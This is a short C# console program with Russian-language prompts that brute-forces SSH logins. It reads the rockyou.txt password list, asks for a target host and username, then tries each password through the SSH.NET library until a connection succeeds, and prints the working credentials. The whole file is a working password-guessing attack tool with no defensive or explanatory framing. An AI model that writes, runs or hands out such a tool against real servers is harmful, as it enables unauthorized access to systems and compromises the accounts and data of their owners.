using System;
using Renci.SshNet;
using System.Text;
using System.Collections.Generic;
using System.IO;
using System.Linq;

class Program
{
    static void Main()
    {

        string filePath = "rockyou.txt";

        if (!File.Exists(filePath))
        {
            Console.WriteLine("Файл словаря не найден.");
            return;
        }

        
        List<string> dictionary = File.ReadAllLines(filePath).ToList();

        Console.Write("Введите IP адрес или домен: ");
        string host = Console.ReadLine();

        Console.Write("Введите имя пользователя: ");
        string username = Console.ReadLine();

        foreach (string password in dictionary)
        {

            if (string.IsNullOrWhiteSpace(password))
                continue;
        
            Console.WriteLine(password);
            try
            {
                using (var client = new SshClient(host, username, password))
                {
                    client.Connect();
                    if (client.IsConnected)
                    {
                        Console.WriteLine("\nПодключение успешно!");
                        Console.WriteLine($"\nIP адрес или домен:{host}");
                        Console.WriteLine($"\nИмя пользователя:{username}");
                        Console.WriteLine($"\nПароль:{password}");
                        client.Disconnect();
                        break;
                    }
                    else
                    {
                        Console.WriteLine("Не удалось подключиться.");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Ошибка: " + ex.Message);
            }

        }

        Console.WriteLine("\nНажмите любую клавишу для выхода...");
        Console.ReadKey();
    }
}